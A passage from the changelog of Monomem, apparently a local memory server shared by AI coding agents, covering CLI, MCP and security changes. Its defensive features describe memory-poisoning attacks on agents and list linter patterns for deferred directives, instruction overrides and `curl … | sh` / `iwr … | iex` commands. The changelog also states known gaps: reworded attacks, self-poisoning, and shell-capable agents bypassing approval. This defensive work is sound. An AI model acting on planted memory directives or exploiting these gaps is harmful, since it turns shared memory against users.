  `memory_get` is enabled (`Open any with memory_get ids=[N]`); it used to name `state_read ids=[...]`, a parameter `state_read` did not take. A second recall for the same
  session (after `/compact` or `/clear`) no longer adds to the meter's "saved" estimate again; the injection itself is still counted.
- **Audit lines only for committed writes:** a write inside a transaction that is rolled back (a failing batch, for example) leaves no
  audit line; lines from a transaction are written when it commits.
- **CLI:** `search` / `relevant --json` print JSON (`{keywords, results: [{id, namespace, title, updated_at, written_by}]}`);
  `search --limit` takes a whole number of 1 or more, like `ls`; `--ns` works as `--namespace` in `relevant`, `search`, `export`,
  `quality`, `conflicts`, `facts`, `digest`, `pii` and `decay`; a value flag with no value says `--<flag> needs a value`. `show`
  prints a multi-line body line by line (control characters still replaced). `ls --ns x` with no notes there names the namespaces in
  use; the dashboard says the namespace box is the reason. The secret refusal says "an AWS access key", not "a AWS access key".
- **Wording:** the start banner says the MCP-over-HTTP address is for apps that connect over HTTP with a key (it said "tunnel this");
  health's drill line reads "20 of 22 known attacks blocked; the 2 that get through are known limits"; doctor's no-edges warning names
  imports and restores, which skip linking. README: a line about `npx monomem demo`, and the benchmark is "above" the honest numbers;
  `demo` is in the short help.
- **`MONOMEM_HOME` / `ONEMEMORY_HOME`:** set but blank is an error (`MONOMEM_HOME is set but empty; set it to a folder or unset it`,
  naming the variable that is blank) instead of silently falling back; one pair of surrounding quotes is removed; a value that still
  holds `%NAME%`, `$NAME` or `${NAME}` is an error that says to write the full path (an app's config file does not expand variables).
- **First-run token:** the `.token` file is created with `wx`, so several processes starting at once all use the one value written
  first (before, two could each write their own value, and the one whose write landed first then held a key the file no longer had).
- **Hard delete and the WAL:** after `Store.delete` (and `purgeHistory`) Monomem runs a non-waiting `PRAGMA wal_checkpoint(TRUNCATE)`,
  so the deleted text does not stay in `state.db-wal`; `PRAGMA journal_size_limit = 4194304` caps the WAL left after a checkpoint.
  If another app's open read keeps part of the log, `monomem delete` says the text can stay in `state.db-wal` until every app
  disconnects.
- **The stdio server closes the store when the app closes the pipe** (stdin end/close) and on SIGHUP, not only on SIGINT/SIGTERM, so
  buffered read counts are written. Its hourly sweep now also prunes the change log, so the 90-day limit in the README holds for
  stdio-only installs. `monomem start` also stops cleanly on SIGHUP.
- **Stale or outdated app entries:** setup rewrites a Monomem entry whose absolute command or `cli.js` no longer exists, or whose npx
  pin (`monomem@X.Y.Z`) is another version, and says why ("points at C:\nope\cli.js, which no longer exists", "launches monomem 1.2.0,
  this is 1.3.0") instead of "already fine"; an old npx-pinned start-of-session hook is rewritten too. Codex's TOML entry gets a
  by-hand instruction instead (not rewritten). `monomem doctor` prints a `[warn]` per stale entry and per hook file with an
  npx-pinned hook of another version (setup rewrites only the start-of-session one; the capture hooks are reported, not rewritten),
  and `monomem health` counts them as one warning. The data-folder comparison expands `~` and ignores
  letter case on Windows. Health finds Claude Code by `~/.claude.json` or `~/.claude` (as setup does); with only the config file it
  says to run `monomem setup --hook`. With a database that exists but is damaged, the drill and audit lines say so instead of "no
  database".
- **Archived notes explain themselves to agents:** `state_read`, `state_write` and `state_delete` on an archived (not replaced) note
  in a namespace the caller can read say `note N is archived (hidden, not erased); a person can restore it with monomem restore N; ...`;
  other namespaces still get `no note with id N`. `monomem ls --archived` lists archived notes with the `restore <id>` command for each.
- **Search results with no notes carry no SECURITY NOTICE banner** (there is no stored text in them); any result with a note keeps it.
- **`MONOMEM_HOME='""'`** (quotes around nothing) now fails with "is set but empty" instead of resolving to the current folder.
- **Variable check in `MONOMEM_HOME`:** `$NAME` / `${NAME}` is refused only at the start of the path or of a path segment, so a real
  folder such as `C:/data$foo` is accepted; `$HOME/x` and `C:/x/$FOO/y` are still refused (so is a segment like `$Recycle`, by
  design). `%NAME%` is refused anywhere, as before.
- **The hint after `monomem delete`** names `monomem scrub --yes`.
- **Multi-id `state_read`** reads each id once (`ids: [1,1,1]` returns one note and counts one access). Once `max_chars` is used up
  the remaining notes are not read or counted; their ids come back in `not_read_budget_spent`.
- **`monomem backup`** builds its copy under a name of its own (process id plus random, like the pre-upgrade copy) and removes only
  that file, so two backups into one folder cannot delete each other's copy in progress.
- **Import dedupe works without `created_at`:** a note in an import file with no `created_at` is skipped when a note with the same
  namespace, title and body exists, so importing such a file twice no longer doubles it. With `created_at` the old rule applies.
- **`monomem setup` with several old entries in one file** (`claude-bridge` and `onememory`, which would each become `monomem`):
  it migrates one and removes the others in the same edit, preferring the entry whose database has notes, otherwise
  `claude-bridge`, and the plan says which data is kept and which entry is dropped. When two different databases both have notes
  that app is skipped with the export / import commands that merge them, and the other apps still go ahead. With `MONOMEM_HOME`
  set, the plan and the migration note name that folder instead of `~/.monomem` / "standard data location".

### Changed

- **`state_read` with several `ids`** reads up to 10 through the same checks as one id and returns `{notes, missing}` (and `archived`
  for archived ones); `max_chars` is shared by all bodies; ids past 10 come back in `ignored_ids` with a hint.
- **MCP tools report arguments they do not have** as `ignored_arguments` with a hint (and a did-you-mean for `text`, `content`, `note`
  (body), `ns`, `namespaces` (namespace), `q`, `search` (query), `tag` (tags)); these names are not accepted. `state_write` with no
  title or body but such an argument holding text is refused (`a new note needs a title or a body (you sent \`text\`; use \`body\`)`);
  `state_search` with an ignored `namespaces` says the search was not limited to a namespace.
- **Session-start lines start with `#<id>`**, a body that begins with its own title does not print the title again, and the footer no
  longer lists the ids.
- **`monomem edit <id> -`** reads the new text from a pipe (first line the title, the rest the body), with the same "changed meanwhile"
  check. Without a terminal and without `-`, `edit` exits at once with that hint instead of starting an editor; `--editor` starts
  `$VISUAL` / `$EDITOR` anyway.
- **Import yield:** a longer pause between import batches (110 ms) was tried in round 2 and rejected: a write from another process
  during a 10,000-note import already finished in about 0.5 s with the `setImmediate` gap, and the pause added about 2.5 s per 10,000
  notes. `setImmediate` is kept.
- **MCP results are smaller.** `state_search` and `state_list` cut each note body to 600 characters (`body_truncated: true`,
  `body_chars: N`); `state_read` is unchanged. MCP JSON is no longer indented (REST is unchanged). `state_write` returns the note without
  its body. `memory_supersede_preview` returns one block (the JSON with `warning`, `token`, `expires_at`) instead of the warning twice.
  Measured on 5 notes of 54,000 characters each (characters of tool output): `state_search` 273,089 to 5,548, `state_list` 272,805 to
  5,384, `state_write` 54,979 to 852, `memory_supersede_preview` 5,685 to 3,595, `state_read` 54,893 to 54,783 (no indent only).
- **The default MCP tools accept common argument drift:** ids, limits and offsets given as strings (`"5"`), tags as one
  comma-separated string, fact values as numbers or true/false, and `facts` as a JSON string; every limit (10 facts, 80-character
  values, tag counts) still applies after. `state_write` creating a note with no title takes the body's first line (about 60
  characters, cut at a word) and says so in `title_generated`; no title and no body is still an error. `state_read` also takes `ids`
  (one id reads like `id`; several: see below) and returns at most `max_chars` (default 40,000) of the body, from `offset`, with `body_truncated`,
  `body_chars` and `next_offset` when there is more (round 1 said `state_read` is never cut; that is no longer true above 40,000).
- **`catch_up`, `memory_since` and `memory_ack` with no `consumer`** use this connection's own writer name (the token label, or
  `stdio:<app>` written as `stdio_<app>`), so two apps on one store each keep their own "last" marker; before, they shared
  `"default"` and one app's catch-up hid the changes from the other. `consumer: "default"` still gives the shared marker.
- **Claude Code's session-start notes leave out notes `import --claude` brought in** (tagged `claude-md` or `claude-auto-memory`):
  Claude Code already reads those files. Recall treats the hook as Claude Code's when `CLAUDE_PROJECT_DIR` or `CLAUDECODE=1` is set.
  Search and other apps still show them; `import --claude` and docs/switching.md say so.
- **Keyword ranking weighs the title most, then tags, then the body** (`bm25(notes_fts, 5, 1, 2)` in both keyword queries), and
  equal scores go to the newest note (`updated_at`, then id, in SQL and in the ranking step). Session-start context keeps id
  order for equal keyword scores, because recency is already its own signal there. Measured with `monomem bench` on
  2026-11-09 against the same code with equal weights: LongMemEval-S and LoCoMo-10 by session unchanged (96.6 / 98.3 and
  90.3 / 95.5 recall@5 / @10), LoCoMo-10 by turn 58.1 / 65.6 to 57.8 / 65.0 (57.7 / 65.2 on another run: ties between notes written in the same
  millisecond can fall either way).
- **`state_search`** states its limit bounds in the schema (default 20, min 1, max 200); a larger `limit` is lowered to 200 and
  the response says `limit_capped: 200`; when the results fill the limit it says `more: true` (there may be more matches).
- **CLI `search` / `relevant`** print "Showing N; more notes match. More: --limit X" when the list was cut (one extra hit is
  fetched to tell), and **`ls`** prints "Showing 20 of 25 (newest first). More: monomem ls --limit 50".
- **Keyword extraction keeps two-letter words that matter:** written in capitals (`CI`, `QA`, `UI`, `PR`), or when dropping them
  would leave no keyword at all (`go`, `db.ts` gives `db` and `ts`). In the searches that run on extracted keywords (relevant
  mode, CLI `search` / `relevant`, session-start context and the any-keyword fallback of keyword search) a keyword of one or two
  letters is matched exactly, not as a prefix, so `go` does not match `golang`; a typed keyword search still prefix-matches every
  word. "remind, recall, remember, tell, know, please, want, wanted, need, let, show,
  find" are now stop words, so "can you remind me what we decided about the database migration?" searches for the decision.
- **`monomem changes`** (human output) prints at most `--limit` entries (default 100) and then "... N more (use --json or a
  narrower --since)" instead of printing every page; `--json` still pages through and prints them all. The window's totals are
  counted on the first page only and carried in the signed cursor, so later pages skip the two counting queries.
- **`monomem init --print`** shows Claude Desktop / Cursor in the `mcpServers` block and VS Code / Copilot in a separate
  `.vscode/mcp.json` block (`{"servers": {"monomem": {"type": "stdio", ...}}}`); the README says the same.
- **`monomem import --file`** says "N note(s) were pinned in the file; pins are not imported" when the file has pinned notes
  (`pinned_not_imported` with `--json`).
- **README numbers re-measured** on 2026-11-09 with this code: the session-start block for 60 short notes (new script
  `bench/recall-size.mjs`) and the keyword and hybrid retrieval figures. Keyword: LongMemEval-S 96.6 / 98.3, LoCoMo-10 by session 90.3 / 95.5, by turn
  57.8 / 65.0 (recall@5 / @10; it was 97.0 / 98.3, 90.2 / 95.6, 58.2 / 65.8 on 2026-11-04; docs/BENCHMARK.md has the
  breakdown). Hybrid (`nomic-embed-text` via local Ollama), replacing the figures measured before the date-hint change:
  LoCoMo-10 by session 91.8 / 96.7, by turn 66.3 / 74.9, LongMemEval-S 98.5 / 99.4. The session-start block for 60 short
  notes is about 5,900 characters (~1,500 tokens) and lists all 60 (it said 7,100 characters, 57 of 60).

### Added

- **Everyday commands:** `monomem add "text" [--title T] [--ns work] [--tag a,b] [--private | --sens public|internal|private]` (`-` reads a
  pipe; same linter, secret refusal and held-write review as any other writer; written as `cli`), `monomem show <id>`,
  `monomem ls [--ns x] [--limit 20]`, `monomem edit <id>` (in `$EDITOR`; refused if the note changed meanwhile) and `monomem forget <id>`
  (an archive you can undo with `restore`). `monomem search` with no words lists your notes, as its help says. The CLI is you, the
  owner: sensitivity limits apply to apps, not to it.
- **`monomem restore <backup folder | state.db>`**: puts a backup (or a `.pre-vNN-backup`) back as your database. Refuses while Monomem or
  an app is using it, copies the current database aside, removes stale `-wal`/`-shm`, checks the result.
- `search --mode semantic|hybrid` (and REST/MCP `mode`) now says "semantic search is not set up; showing keyword results" when no
  embedding service is on (a `notice` field on REST and MCP). Ordering is unchanged. `relevant` shows a short snippet per note.
- `POST /tokens` accepts `max_sensitivity` (and still `max`) and answers 400 naming the valid fields for an unknown one.
- `health` gains one capped **Exposure** check (app keys with no limit, notes that may hold personal data and are not marked private, apps
  connected without a key): all reasons together cost at most one grade step.
- Write responses (REST `similar_note`, MCP `similar_note`, and the `add` command) hint "looks similar to #N - consider updating it".
  Nothing is blocked.

### Fixed

- Conflict reports: a broad overlap (more than two notes on one key) is "low", never "high", and no longer suggests replacing more than two
  notes with one command.
- `health` and `doctor` agree: the optional start-of-session hook and `.pre-vNN-backup` copies are info, not warnings.
- Session-start recall shows as many notes as 1.2.1 (short `by <name>` label on index lines, one legend line).
- A search over 4096 characters or 64 words is refused with a clear message on every route (a 1 MB query once held the database for
  about 99 seconds). The index builder also cuts it as a second layer.
- `monomem <search|relevant> --help` lists the real options. `recall` run by hand at a keyboard prints text (`--json` for the hook
  payload; the hook itself is unchanged). `stats.mostAccessed` no longer lists notes nobody has read.
- Undoing a replacement says the replacement note is still live and how to archive it. The "read access log: a row was skipped" message
  is now a calm one-time info line. A database from a newer build prints one plain line from the stdio server, naming the
  `.pre-vNN-backup` copy, instead of a stack trace.
- `private` is described plainly everywhere: limited apps cannot see it; apps with no limit (including your main Claude connection)
  still can, with the next step.

### Added (sensitivity labels, schema v19)

- **Per-memory sensitivity labels and per-token ceilings.** Each note is `public`, `internal` (the default) or `private`. A token
  in `tokens.json` / `MONOMEM_TOKENS` can set `max_sensitivity`; above that ceiling a note is not found, searched, listed, counted,
  exported, injected, shown in the change feed, named by `why`, `receipts`, `pinned`, `rollback` or the fact-conflict check, on every
  route, and the token cannot write or relabel above it (lowering a label needs an administrator key). A hidden note looks exactly like
  a missing one. Tokens without a ceiling behave as before. Set labels with `sensitivity` on `state_write` / `POST /notes`, or
  `monomem label <id> <level>`. `MONOMEM_RECALL_MAX_SENSITIVITY` caps the session-start and file-context hooks,
  `MONOMEM_STDIO_MAX_SENSITIVITY` caps a stdio app, and `MONOMEM_EXPORT_MAX_SENSITIVITY` / `monomem export --max-sensitivity` cap the
  Markdown vault. The access log (`/access`) and the meter totals are not available to a key with a ceiling. See
  `docs/sensitivity-labels.md`.
- **Schema v19** (adds the label columns; every existing note becomes `internal`). A backup is written to `<db>.pre-v19-backup`, and
  older builds refuse the file.
- **`monomem token add <name> --max public|internal|private | --no-limit`** (the existing `token add --label ... --scope ...` form still
  works), a running server picks up `tokens.json` changes within a couple of seconds, and the dashboard has an Apps panel to add and
  remove keys. `monomem connect <app> [--restricted]` gives one app its own key and limit; `monomem open` opens the dashboard signed in
  with a one-time code; `GET /whoami` tells an app what it can see.
- Checkups that only suggest, never change: `monomem scrub` (backup first, then compacts the file and rebuilds search so deleted text
  is gone; also `purge-deleted`), `monomem pii scan` (suggests `monomem label <id> private`), `monomem digest`,
  `monomem safety-report --out report.html`, `monomem audit` (who changed what; `audit verify` is unchanged), `monomem demo`,
  `monomem snippet`, `monomem import --rules`. Two new `monomem quality` checks: personal data in notes not marked private, and notes
  that may contradict each other. The dashboard has a tidiness card, an Audit tab and a Changes window picker.
- Per-command help: `monomem <command> --help`.

### Changed

- A big namespace is no longer indexed inside the write that needs it: above 5,000 live notes the similarity index is built in the
  background in short slices. New indexes make the default note list about ten times faster at 50,000 notes.
- Both servers set explicit connection limits and refuse a request that reaches them under an unexpected host name
  (`MONOMEM_ALLOWED_HOSTS`; localhost, IP addresses and proxied or tunnelled requests are unaffected).
- `monomem backup` no longer copies the encryption key into the backup folder unless you pass `--include-key`; it says where the key is.
- Session-start recall labels each index line with who wrote it (short `by <name>`, explained once) and ends with a reminder that the notes are data.
- `monomem setup` and `connect` replace Monomem's own keyless entry with a limited one when you ask for a limit (shown, backed up, undoable).
- `monomem demo` runs one benchmark suite (permission isolation) so the tour takes seconds.

## [1.2.1] - 2026-11-06

### Fixed

- The `monomem health --card` and `monomem meter --card` share cards show the official Calas mark instead of a
  hand-drawn crescent. The banner, social preview and favicon carry the official mark too.

## [1.2.0] - 2026-11-05

### Highlights

- **Check your own setup.** `monomem drill` replays 20 known memory-poisoning attacks on a copy of your store.
  `monomem health` turns that and your settings into one A to F grade and prints the rule. Two attacks are known misses.
- **See where a note came from:** `monomem why`, `monomem receipts` and `monomem search --as-of`.
- **Catch writers who disagree:** `monomem facts`, `monomem conflicts` and `monomem facts --check`.
- **More control:** `approve-first --all`, `pin`, `rollback --writer`, the flood guard, the read access log, a
  hash-chained audit log and `monomem token add`.
- **Claude Code plugin.**
- **Upgrade note:** the database moves to schema v18 on first start, after a verified backup. Older versions cannot
  open it. See [docs/upgrading.md](./docs/upgrading.md).
- **Limits:** the linter matches patterns, so reworded attacks get through; an agent with a shell can run the CLI itself.

### Added

- `monomem audit verify --expect <hash>` checks the audit log against a head hash you kept somewhere else.
- INSTALL.md: how to connect a teammate's Claude Code, Cursor or Codex to a shared Monomem server.
- Setup offers a dry-run import when it finds the official MCP memory server configured.

- **`monomem approve-first --all on|off`** (admin `PUT /approve-first {all, on}`): every agent write in every
  namespace, including ones created later, waits for approval. Turning it off needs a person at a terminal.
- **`monomem facts --check [--namespace ns]`** exits 1 when any fact is disputed, for CI. `monomem facts` marks each
  writer's current value and its older notes.

- **`monomem facts [--namespace ns] [--json]`**: every fact key per namespace with its current value(s), who wrote them
  and since when; disputed keys are marked, and agreement shows as "N writers agree". `monomem fact remove <id> <key>`
  drops one fact from a note. A write whose title or body names a different value than one of its own facts gets a
  `fact_warnings` entry (it is still stored).

- **Time travel.** `monomem search "<query>" --as-of <ISO|7d|2h>` and the MCP `state_search` `as_of` show memory as it
  stood at a past time, rebuilt from note history. A note whose text from then was pruned or purged says "text from
  that time not kept" instead of showing newer text as old; hard-deleted notes cannot be rebuilt and the output says so.
  Read-only. Ranking at a past time is a simple keyword match, not the full search.

- **`monomem health [--json] [--card [file.svg]]`.** One line per check (setup, security settings, the poisoning drill,
  the audit chain, writes waiting for review, distrusted writers, redacted notes, memory size) and a grade from A to F.
  The rule is printed with it: each warning lowers the grade one step, any failure caps it at D, and an attack the drill
  did not expect caps it at F. It also says what the grade does not cover (the linter matches patterns, so reworded
  attacks and self-poisoning still get through). Exit code 1 for D to F.
- **`monomem why <id>`** and the opt-in MCP tool `memory_why`: one note's history in time order (who wrote it, each
  version, replacements, held edits, pin, the session starts it was shown at and why, current status). Titles only. It
  ends with what is not recorded, such as who read the note (only a total and the last read time are kept).
- **Conflicts between writers.** Agents can attach exact facts to a note (`facts: { "deploy_target": "render" }` on
  `state_write` or `POST /notes`, stored as `fact:key=value` tags). When another writer's live note in the same namespace
  has the same key with a different value, the write still succeeds and the reply lists the conflict, so the agent can
  ask you. `monomem conflicts`, `monomem quality` and the dashboard list these first, then a "possible" tier from a text
  rule (`key: value` lines in notes with the same title). It only flags; in the dashboard you choose Keep, Pin or
  Distrust. Measured on 20 realistic contradicting pairs: the fact tier caught 20 of 20 when the facts were attached and
  scoped per subject (`orders.database`, not `database`); without facts the text rule caught none of them. Notes from
  distrusted writers are left out, and each side shows whether its writer name is stamped from a token or self-declared.
- **Claude Code plugin.** `/plugin marketplace add calasdan-sketch/monomem`, then `/plugin install monomem@monomem`,
  adds the MCP server, the start-of-session recall hook and the skill (see [docs/plugin.md](./docs/plugin.md)).
  `server.json` and `mcpName` are ready for the MCP registry.

- **`monomem drill`.** Replays 20 known memory-poisoning attacks on a temporary copy of your store, with your own
  settings, and shows for each one whether it was held, stored with a warning, or reached the agent. Your store is not
  changed. Two attacks are known misses and are listed as such: a reworded override the pattern linter cannot see
  (scenario E16 in `monomem bench`), and self-poisoning (a trusted agent stores an attacker's instruction in its own words). Exit code 1 when
  anything else gets through; `--json` for scripts. `evals/poisoning-corpus.json` (MIT) holds the attacks and expected
  results so other memory tools can run the same set.
- **Memory receipts.** `monomem receipts [session-id] [--json]` shows which notes each session start showed the agent
  and why (the reason tags), with rank and approximate tokens. Only note ids and tags are stored, never titles or text,
  and they are kept as long as the access log (`MONOMEM_ACCESS_LOG_DAYS`). Opt-in MCP tool `memory_receipt`.
- **`monomem meter [--json] [--card [file]]`.** Prints the footprint, or writes a shareable SVG card (sessions, tokens
  injected, tokens saved as an estimate at about 4 characters per token).
- **`monomem token add | list | remove`.** Makes a strong random token for `tokens.json` and shows it once; `list` never
  prints tokens. New guide: [docs/team.md](./docs/team.md) (shared memory for a team).
- **`monomem search <query>`** does what `monomem relevant` does.
- `GET /favicon.ico` serves the Monomem mark without a token.

- **Tamper-evident audit log.** Each audit line carries `prev`, the sha256 of the line before it (carried across
  rotation), and `monomem audit verify` counts every break and prints the head hash. Two apps writing at the same
  moment are counted as a fork, not a break (an inserted line also looks like a fork, so forks are reported). It detects lines edited or removed inside the chain; it cannot detect the
  newest lines being cut off, rotated files being deleted, or the whole file being rewritten by anyone who can write
  it (an agent with a shell included). Lines written by older versions have no `prev` and are counted as unchained.
- **Dashboard: a Held tab.** Reject is the main button, Approve the secondary one. Writes waiting for review are listed with their reasons ("instruction override",
  "namespace requires approval" ...), writer and namespace, with Approve and Reject. Admin `GET /quarantine` lists them.
- **Dashboard: who wrote it, on every card.** Each note shows its writer with a colour chip, and pinned notes are marked.
- **MCP results say when.** `state_search`, `state_relevant` and `state_get` results carry a compact `when`: the date
  the note was first written and how long ago (for example "2023-05-08, 5 months ago"; dates are UTC).

- **Import from the official MCP memory server.** `monomem import --from mcp-memory [--path memory.jsonl] [--dry-run]` turns
  each entity of `@modelcontextprotocol/server-memory`'s knowledge graph into a note (observations as a list, relations
  underneath). Without `--path` it uses `MEMORY_FILE_PATH` or finds the file in the npx cache, where that server keeps it by
  default and where it is easily lost. Same rules as the other imports: local only, dry run first, secrets skipped, every
  note through the memory linter. See docs/switching.md.

- **Approve-first namespaces.** `monomem approve-first <namespace> on|off` (no arguments lists them), or admin-only
  `GET`/`PUT /approve-first` over REST. In such a namespace every write that is not from the local `monomem` CLI goes
  into the existing quarantine queue with the reason "namespace requires approval", and is approved or rejected there
  like a linter-held write; approval keeps the real writer. Held: creates, and updates that change the title, body or
  source, add tags, or move a note into or out of the namespace. MCP (stdio and HTTP), every REST call (an admin token
  included: REST cannot tell an operator from an agent holding one), the runner and the capture hooks are held. No MCP
  tool changes the setting. Secrets are still refused outright. Forgetting, restoring and replacing notes there cannot
  be queued, so they are refused for everyone but the CLI (state_delete, supersede preview/confirm/undo, setting a
  `forget_after` date, REST archive, restore and hard delete return an error naming the namespace). An agent with a shell tool can run that CLI itself, so this protects against MCP and REST agents, not against agents that can run commands (see SECURITY.md). Details: [docs/memory-linter.md](./docs/memory-linter.md).
- **Pinned notes (CLI-only).** `monomem pin <id>` / `monomem unpin <id>` (`monomem pin` lists them), or admin-only
  `GET`/`PUT /pinned` over REST; no MCP tool pins. Agents still read a pinned note (reads show `pinned: true`), but only the
  local `monomem` CLI can edit, forget, restore, hard-delete, replace (as the replaced note, and by supersede undo), restore an
  older version of, purge the history of, or merge it. Every other caller gets an error naming the note: MCP, every REST call
  (an admin token included, as for approve-first; an admin token can unpin and then change it), the server's own jobs. The
  expiry sweep and decay never archive a pinned note. A JSON export includes `pinned: true` for reference; it is not restored
  by import or sync. Details:
  [docs/replacing-memories.md](./docs/replacing-memories.md#pinned-notes-cli-only).
- **Roll back one writer.** `monomem rollback --writer <name> --since <ISO|30m|2h|7d> [--include-conflicts] [--yes]`, admin
  `POST /rollback/preview` + `POST /rollback/confirm`, and the operator-only MCP tool `memory_rollback` (off over stdio unless
  `MONOMEM_STDIO_ADMIN_TOOLS=1`). Notes the writer created since then are archived; notes whose title or body it changed get the
  newest kept version from before its first change back, as a new version (so the history undoes it). Notes another writer
  changed afterwards are skipped as conflicts unless `--include-conflicts`; a needed version that was pruned or purged is
  reported as "cannot fully undo" and skipped. `stdio` covers every `stdio:<app>`. The preview writes nothing and returns a
  one-time code (bound to the caller, expires); the confirm plans again, refuses if anything changed, and applies everything in
  one transaction. Pinned notes and approve-first namespaces are rolled back from the CLI only. Tag/metadata edits, archives,
  replacements and deletes the writer made are not rolled back. Details:
  [docs/replacing-memories.md](./docs/replacing-memories.md#rolling-back-one-writer).
- **Read access log.** Every memory read an agent makes (the MCP read tools, the REST read routes, the session-start and
  per-file context the hooks inject) adds one row: time, the writer identity a write would be stamped with (token
  label, or `stdio` / `cli` / `capture` ...), the tool or route, the namespaces, a query preview (secret-redacted, one
  line, at most 120 characters, encrypted when at-rest encryption is on) and the result count. Never note text or
  titles. View it with `monomem access [--since 24h|ISO] [--writer label] [--limit N] [--json]` or admin-only
  `GET /access` (refused for a namespace-pinned token). No MCP tool reads it. Kept `MONOMEM_ACCESS_LOG_DAYS` (default
  30; `0` = off). Details: [docs/access-log.md](./docs/access-log.md).
- **Flood guard.** A writer label that makes `MONOMEM_FLOOD_WRITES_PER_HOUR` (default 500; `0` = off) creates/updates in
  a rolling hour is paused: its next write and every later create, update, forget or restore is refused (HTTP 429 over
  REST) until `monomem resume <label>` or admin `POST /flood/resume`. A pause writes an audit entry and a stderr
  warning, survives a restart, and shows in `monomem flood`, `monomem access` and `GET /flood`. Counted: every
  create/update call that reaches the guard (stored, held or refused). Never counted or paused: the `monomem` CLI, the
  server's own jobs, quarantine approval, consolidation, backup restores. A labelled stdio app (`stdio:<app>`) has its
  own count; unlabelled ones share `stdio`. The label is self-declared, so the guard stops runaway loops, not a
  hostile app.
- **`state_search` `mode: "relevant"`** does what `state_relevant` does: `query` is read as a conversational message,
  its keywords are extracted, and notes matching any of them come back with the keywords (default limit 5).
- **Two warn-only linter categories.** `pii`: email addresses, phone numbers, IPv4/IPv6 and
  private (RFC 1918) addresses, and `.local` / `.internal` / `.corp` / `.lan` host names.
  `directive`: deferred triggers for a later agent ("next time the user asks …, run …", "from now
  on always …", "in future sessions …"), `curl … | sh` and `iwr … | iex`, and install-a-package
  commands (npm/pnpm/yarn/bun, pip, cargo, go). Both store the note and return a warning by
  default. `MONOMEM_LINT=pii=quarantine` or `directive=quarantine` holds such writes instead; they
  never block. Reserved and documentation names (`example.com`, `192.0.2.x`, `2001:db8::`),
  loopback and `v1.2.3.4`-style versions are not flagged. These are regex warnings: they miss
  names, addresses and reworded directives, and they flag some harmless notes (a bare `1.2.3.4`,
  "from now on use pnpm"). → [docs/memory-linter.md](./docs/memory-linter.md)
- **Each local app's writes say which app it was.** `monomem setup` now puts `MONOMEM_CLIENT=<app>`
  in each app's MCP entry (`claude-code`, `claude-desktop`, `cursor`, `codex`, `gemini`, `muse`,
  `vscode`, `zed`; a folder's `.mcp.json` gets `claude-code`), and the stdio server stamps
  `written_by` as `stdio:<app>` instead of plain `stdio`. Re-running setup adds the name to an
  existing entry once (Codex: only when `[mcp_servers.monomem]` is its own table without an `env`
  yet; otherwise setup says how to add it by hand). HTTP entries are left alone. An install that
  never re-runs setup keeps stamping `stdio`.
  The name is **self-declared** by the config file (anything that can edit it, or launch
  `monomem mcp` itself, can claim any name). It tells apps apart; it is not authentication and
  grants nothing: stdio access is unchanged. Scoped tokens over HTTP remain the authenticated option.
  A name must be 1-40 characters `a-z 0-9 . _ -` (lower-cased); anything else is ignored with a
  warning on stderr and writes stay `stdio`.
- The client's own `clientInfo` name and version from the MCP handshake are written to the audit
  log (`mcp.connect`) as a **claim** only; they are never used for `written_by` or any decision.

### Changed

- `drill` and `health` say plainly that the drill covers the published known attacks only, which the linter was tuned on.
- Setup and health no longer assume Claude Code; health does not count a declined or absent Claude hook against you.
- Dashboard: labelled buttons for screen readers, a heading per view, a red count for fact disputes, "held" wording
  throughout. The health and meter cards carry the Monomem mark and how to install it. The demo is recorded in the
  dark theme. SECURITY.md has a contact address, a disclosure window and a "Your data" section.

- `monomem facts` puts synonym keys on one row under the common key ("also written as db") and counts agreement
  across spellings. The key hint always steers toward the common key, never away from it.
- Clearer wording: `approve-first` lists the store-wide switch first; the Held card no longer repeats itself and shows
  the held note's facts and tags; the start-of-session footer says how many tokens are the notes themselves; `why`
  cuts long titles at a word. Times in `why` and `receipts` are local with the UTC offset (JSON stays in UTC).
- README: approve-first protects against tools that only have the memory connection; an agent that can run shell
  commands can run `monomem` itself (see SECURITY.md).

- Disputes are grouped per namespace (the same key in two projects is not a dispute); an unscoped session start names
  the namespace. Synonym keys (`hosting`, `runs_on` for `deploy_target`) count as one setting in `conflicts`, `facts`,
  the session start and the dashboard. `similar_keys` also catches plurals and one-letter slips.
- The session start explains each writer's label once instead of on every line, and the `state_write` text shows a
  `facts` example. The body/fact warning says the text "may" name another value.
- README: a shorter first screen and a table of the check-and-explain commands with what each cannot catch.
- The `--as-of` header says in plain words how far archive history reaches and skips a zero count.

- **Dispute lines work in a default install** (no namespace setup needed). Each is a notice from Monomem with the
  quoted values, note numbers and writers, one value per writer, at most two lines plus "+N more"; notes marked
  never-show and distrusted writers are left out. A writer who changed their mind is not shown as disagreeing with
  themselves.
- `similar_keys` gives the existing value, note and writer plus a one-line hint, no longer flags a subject-prefixed
  key against its own base key, and a value set under a synonym key (`hosting` vs `deploy_target`) is reported as a
  conflict. REST `PUT /notes/:id` accepts `facts` and returns the same conflict information as `POST`.
- Dashboard Keep reports a change that was held for review as held, marks the other note `fact-removed:<key>` and
  says its text may still name the old value; Pin and Distrust sit under "More".
- `--as-of` no longer shows today's writer id, attestation or confidence next to old text; times include seconds; the
  header counts notes that were archived or replaced then.
- `monomem drill` and `health` run with embeddings off and make no network call, even when a remote
  `MONOMEM_EMBED_URL` is set. An unrecognised `MONOMEM_LINT` value gets a "did you mean" hint and names the default
  used. A failing embeddings backend is reported once per process, not once per note.
- REST `PUT /notes/:id` accepts and ignores the server's own read-only fields, so reading a note and sending it back
  works; unknown fields are still refused.

- **Facts are easier to get right.** `state_write` tells agents to attach `facts` when they record a decision, and to
  use a common key when one fits (deploy_target, package_manager, test_runner, database, node_version, base_url,
  ci_provider, formatter). A key that is new to the namespace gets `similar_keys` hints over MCP, so two agents settle
  on one name. SKILL.md and the docs give the same advice.
- **Disputes show up where agents act.** When writers disagree on a fact in the namespace being recalled, the start of
  a session adds up to two "Disputed: ... Ask the user before acting." lines (nothing when there is no dispute).
- **Conflicts are grouped one block per key** in the CLI, `monomem quality` and the dashboard; a capped list says
  "showing N of at least M". In the dashboard, Keep on a fact dispute removes only that fact from the other notes
  (through the normal edit path, so the linter, approve-first and pins still apply); replacing a whole note is a
  separate choice. The confirmation is a few plain lines inside the card you clicked.
- **Time travel shows who wrote the old text** (from note history), or "writer then: not recorded", never today's
  writer. Archive, restore and supersede undo are now part of the picture from a new `archive_log` (no schema change),
  which covers the time since this version first opened the database; the header says from when.
- `--as-of` output adds a text snippet, an "edited since" marker, local time with the UTC offset, and `--json`.
- `health` and `doctor` also warn on a remote `MONOMEM_EMBED_URL` with embeddings on (note text leaves the machine),
